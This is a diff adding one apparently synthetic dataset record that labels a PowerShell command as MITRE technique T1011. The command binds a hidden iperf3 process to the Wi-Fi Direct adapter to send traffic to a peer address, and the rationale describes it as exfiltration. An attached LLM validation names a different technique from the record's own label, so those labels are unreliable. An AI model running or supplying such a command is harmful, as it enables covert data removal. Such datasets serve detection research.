@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
+  "explanation": "Uses the Wi\u2011Fi Direct virtual adapter and binds iperf3 to it, sending over a peer\u2011to\u2011peer Wi\u2011Fi Direct link rather than the primary network (T1011).",
+  "rationale_steps": [
+    "Identify the Wi\u2011Fi Direct virtual adapter used for P2P links.",
+    "Get the adapter's assigned IPv4 address.",
+    "Run iperf3 bound to this interface on a high port for exfil.",
+    "Hide the process window to lower casual visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce514a45",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, valid cmdlet parameters, and a correct Start-Process invocation.",
+        "semantic_score": 1,
+        "semantic_justification": "Although it plausibly binds iperf3 to a Wi\u2011Fi Direct interface to send traffic, it does not leverage signed system scripts or script hosts as required for System Script Proxy Execution, so it is not aligned with the described technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T21:28:24.421527Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
